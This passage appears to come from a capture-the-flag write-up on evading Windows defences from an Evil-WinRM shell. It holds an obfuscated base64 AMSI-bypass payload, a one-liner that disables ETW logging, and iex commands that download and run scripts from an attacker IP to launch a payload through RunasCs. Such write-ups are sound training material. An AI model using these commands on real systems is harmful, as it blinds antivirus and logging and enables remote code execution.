*Evil-WinRM* PS C:\Users\C.Neri\Documents> [sySteM.tExT.ENcoDinG]::unICodE.GeTstRINg([sYStem.cOnVErt]::FrOMBASe64StriNg("IwBNAGEAdAB0ACAARwByAGEAZQBiAGUAcgBzACAAUgBlAGYAbABlAGMAdABpAG8AbgAgAG0AZQB0AGgAbwBkACAACgAkAE0ATwBkAFQAQwBJAFAAegBWAHQASwA4AEkAdQA2AEoARQA9ACQAbgB1AGwAbAA7ACQAcAB4AG4AUABMAGEAQgA5AEYAUABfAGwAQwBfADQASwB2AFMANABpAD0AIgBTAHkAcwB0AGUAbQAuACQAKABbAEMAaABhAFIAXQAoAFsAQgBZAFQARQBdADAAeAA0AGQAKQArAFsAQwBoAEEAcgBdACgAWwBiAFkAVABlAF0AMAB4ADYAMQApACsAWwBDAGgAYQBSAF0AKABbAEIAeQBUAEUAXQAwAHgANgBlACkAKwBbAEMASABhAHIAXQAoAFsAYgBZAHQARQBdADAAeAA2ADEAKQArAFsAYwBIAEEAcgBdACgAWwBiAHkAdABlAF0AMAB4ADYANwApACsAWwBDAEgAYQBSAF0AKAA3ADAAKwAzADEAKQArAFsAQwBoAGEAcgBdACgAMQAwADQAKwA1ACkAKwBbAGMASABhAFIAXQAoADUAKwA5ADYAKQArAFsAYwBoAEEAcgBdACgAMQAxADAAKgAxADUALwAxADUAKQArAFsAYwBIAGEAcgBdACgAWwBiAHkAdABlAF0AMAB4ADcANAApACkALgAkACgAKAAnAMEA+wB0APMAbQDiACcAKwAnAHQA7gD1AG4AJwApAC4AbgBvAFIATQBhAGwASQBaAEUAKABbAEMAaABhAHIAXQAoAFsAYgB5AHQAZQBdADAAeAA0ADYAKQArAFsAQwBIAGEAUgBdACgAWwBiAHkAdABlAF0AMAB4ADYAZgApACsAWwBjAGgAQQByAF0AKAAxADEANAArADkAOAAtADkAOAApACsAWwBjAEgAYQByAF0AKAA0ADEAKwA2ADgAKQArAFsAQwBIAGEAUgBdACgANgA4ACoANAA3AC8ANAA3ACkAKQAgAC0AcgBlAHAAbABhAGMAZQAgAFsAQwBoAEEAcgBdACgANAA3ACsANAA1ACkAKwBbAEMASABhAHIAXQAoAFsAYgB5AHQAZQBdADAAeAA3ADAAKQArAFsAYwBIAGEAcgBdACgAMQAyADMAKwAyADEALQAyADEAKQArAFsAYwBIAEEAcgBdACgAWwBCAHkAVABFAF0AMAB4ADQAZAApACsAWwBDAGgAYQBSAF0AKABbAGIAeQBUAEUAXQAwAHgANgBlACkAKwBbAGMASABBAFIAXQAoADEAMgA1ACkAKQAuACQAKABbAGMAaABhAFIAXQAoADYANQArADEAOQAtADEAOQApACsAWwBDAEgAYQByAF0AKABbAEIAeQBUAEUAXQAwAHgANgBkACkAKwBbAGMAaABBAFIAXQAoADEAMwArADEAMAAyACkAKwBbAEMAaABhAHIAXQAoADEAMAA1ACoAMwA2AC8AMwA2ACkAKwBbAEMASABBAHIAXQAoADgANQArADQALQA0ACkAKwBbAEMAaABhAFIAXQAoADIAOAArADgAOAApACsAWwBjAEgAQQBSAF0AKAAxADAANQApACsAWwBjAGgAQQByAF0AKABbAGIAWQB0AGUAXQAwAHgANgBjACkAKwBbAEMAaABhAHIAXQAoAFsAYgB5AHQARQBdADAAeAA3ADMAKQApACIAOwAkAHUAcQByAD0AIgArAFsAQwBoAGEAUgBdACgAWwBiAFkAdABFAF0AMAB4ADYAMgApACsAWwBjAGgAYQByAF0AKAAxADIAMAArADQAOAAtADQAOAApACsAWwBDAGgAQQByAF0AKABbAGIAeQB0AEUAXQAwAHgANgA2ACkAKwBbAEMAaABhAHIAXQAoAFsAQgB5AFQAZQBdADAAeAA2AGEAKQArAFsAYwBoAGEAcgBdACgAWwBCAHkAVABlAF0AMAB4ADYAMwApACsAWwBjAGgAYQByAF0AKABbAEIAWQBUAGUAXQAwAHgANgA4ACkAKwBbAGMASABBAHIAXQAoADkANwApACsAWwBjAGgAQQBSAF0AKABbAGIAWQBUAEUAXQAwAHgANgA5ACkAKwBbAEMASABhAFIAXQAoAFsAQgBZAHQAZQBdADAAeAA2AGMAKQArAFsAQwBoAEEAUgBdACgAMQAxADkAKwAxADcALQAxADcAKQArAFsAYwBIAEEAcgBdACgAMQAxADAAKgA4AC8AOAApACsAWwBDAGgAQQByAF0AKABbAEIAeQB0AGUAXQAwAHgANgBjACkAKwBbAGMASABBAHIAXQAoAFsAYgBZAFQARQBdADAAeAA2AGQAKQArAFsAYwBIAEEAUgBdACgAWwBCAHkAVABlAF0AMAB4ADYAZQApACsAWwBDAGgAYQBSAF0AKABbAGIAWQBUAEUAXQAwAHgANgAxACkAKwBbAEMASABhAHIAXQAoADEAMQAwACsAOQA3AC0AOQA3ACkAKwBbAEMASABhAFIAXQAoADEAMgAxACsAMQAwADQALQAxADAANAApACsAWwBDAEgAQQByAF0AKABbAEIAWQBUAEUAXQAwAHgANgAyACkAKwBbAEMAaABhAFIAXQAoAFsAQgB5AHQARQBdADAAeAA2ADkAKQArAFsAYwBoAGEAcgBdACgAWwBCAHkAdABFAF0AMAB4ADcAOAApACsAWwBDAGgAQQByAF0AKABbAEIAeQBUAEUAXQAwAHgANgA5ACkAKwBbAGMAaABBAFIAXQAoAFsAYgB5AHQAZQBdADAAeAA2AGIAKQAiADsAWwBUAGgAcgBlAGEAZABpAG4AZwAuAFQAaAByAGUAYQBkAF0AOgA6AFMAbABlAGUAcAAoADEAMAAzADMAKQA7AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAkAHAAeABuAFAATABhAEIAOQBGAFAAXwBsAEMAXwA0AEsAdgBTADQAaQApAC4ARwBlAHQARgBpAGUAbABkACgAJAAoAFsAYwBoAGEAUgBdACgANQA4ACsAMwA5ACkAKwBbAEMAaABBAHIAXQAoADIAMgArADgANwApACsAWwBDAGgAYQBSAF0AKABbAEIAWQBUAGUAXQAwAHgANwAzACkAKwBbAGMAaABhAHIAXQAoADEAMAA1ACsAMgAwAC0AMgAwACkAKwBbAEMASABBAHIAXQAoAFsAQgB5AFQARQBdADAAeAA0ADkAKQArAFsAYwBIAGEAcgBdACgAWwBiAFkAdABFAF0AMAB4ADYAZQApACsAWwBDAGgAQQByAF0AKAAxADAANQApACsAWwBDAGgAYQBSAF0AKABbAEIAeQBUAGUAXQAwAHgANwA0ACkAKwBbAEMAaABhAHIAXQAoAFsAQgB5AFQARQBdADAAeAA0ADYAKQArAFsAYwBoAGEAcgBdACgAWwBCAHkAVABlAF0AMAB4ADYAMQApACsAWwBjAEgAQQBSAF0AKABbAEIAeQB0AGUAXQAwAHgANgA5ACkAKwBbAEMAaABhAHIAXQAoADYAMwArADQANQApACsAWwBjAGgAQQByAF0AKAAxADAAMQArADQALQA0ACkAKwBbAEMASABBAFIAXQAoAFsAYgB5AFQAZQBdADAAeAA2ADQAKQApACwAIgBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACIAKQAuAFMAZQB0AFYAYQBsAHUAZQAoACQATQBPAGQAVABDAEkAUAB6AFYAdABLADgASQB1ADYASgBFACwAJAB0AHIAdQBlACkAOwAkAGsAeAB2AG8AZgBwAG4AYgB1AGQAeQBqAGMAYgBvAHAAdQBiAHoAagBkAHcAcABzAGkAYgB2AGkAPQAiACsAKAAnAHYAbQBmAPoAJwArACcAcAByACcAKQAuAE4ATwByAE0AYQBsAEkAWgBlACgAWwBDAEgAYQByAF0AKAAxADQAKwA1ADYAKQArAFsAQwBoAEEAcgBdACgAWwBiAFkAVABlAF0AMAB4ADYAZgApACsAWwBjAGgAQQByAF0AKABbAGIAeQB0AEUAXQAwAHgANwAyACkAKwBbAGMASABhAHIAXQAoADEAMAA5ACkAKwBbAGMAaABhAFIAXQAoAFsAQgB5AFQARQBdADAAeAA0ADQAKQApACAALQByAGUAcABsAGEAYwBlACAAWwBjAGgAQQBSAF0AKAA5ADIAKQArAFsAQwBIAGEAUgBdACgAWwBiAHkAdABFAF0AMAB4ADcAMAApACsAWwBDAEgAQQByAF0AKABbAEIAWQB0AEUAXQAwAHgANwBiACkAKwBbAEMASABhAHIAXQAoAFsAYgB5AHQAZQBdADAAeAA0AGQAKQArAFsAYwBoAGEAcgBdACgAMQAxADAAKwAxADAAMQAtADEAMAAxACkAKwBbAEMASABBAFIAXQAoAFsAQgB5AFQARQBdADAAeAA3AGQAKQAiADsAWwBUAGgAcgBlAGEAZABpAG4AZwAuAFQAaAByAGUAYQBkAF0AOgA6AFMAbABlAGUAcAAoADQAMwA0ACkA"))|iex
```

Disable **ETW** in current process to bypass **ETW**-based AV / EDR solutions that analyzes codes from events such as **Script Block Logging**

```bash
PS C:\Windows\system32> [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

> While trying to load `Invoke-RunasCs.ps1`,  `Assembly.Load()` will still be blocked without **AMSI** bypass at dotnet level, example error message below :
> 
> ```powershell
> Exception calling "Load" with "1" argument(s): "Could not load file or assembly '61440 bytes loaded from Anonymously Hosted DynamicMethods Assembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. An attempt was made to load a program with an incorrect format."
> ```
>
{: .prompt-danger }

Bypass **AMSI** at **dotnet** level via [Patching AmsiScanBuffer in clr.dll](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patching-Clr "Goto Patching-Clr") (The script will take about 1+ minutes to run)

```bash
PS C:\Windows\system32> iex (new-object net.webclient).DownloadString('http://10.10.14.90:80/amsi_clr.txt')
```

Now we are able to load and run the embedded assembly from `Invoke-RunasCs.ps1`

```bash
PS C:\Windows\system32> iex (new-object net.webclient).DownloadString('http://10.10.14.90:80/Invoke-RunasCs.ps1'); Invoke-RunasCs -LogonType 9 -Username "x" -Password "x" -Command "C:\programdata\client.exe"

2025/03/24 18:59:16 setting ll:  1
2025/03/24 18:59:16 Forking
```